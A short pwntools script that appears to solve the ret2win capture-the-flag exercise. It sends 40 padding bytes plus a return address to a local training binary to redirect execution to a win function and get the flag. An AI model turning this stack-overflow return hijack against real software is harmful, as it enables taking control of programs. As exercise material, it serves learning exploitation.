from pwn import *

# Set the context to 64-bit
context.bits = 64

# Define the buffer overflow payload
overwrite = b"A" * 40  # 40 bytes of "A" to overflow the buffer
flag_addr = 0x400764  # Address of the function we want to call

# Construct the payload
payload = overwrite + p64(flag_addr)

# Start the vulnerable process
p = process("./ret2win")

# Send the payload
p.send(payload)

# Interact with the process to retrieve the flag
p.interactive()
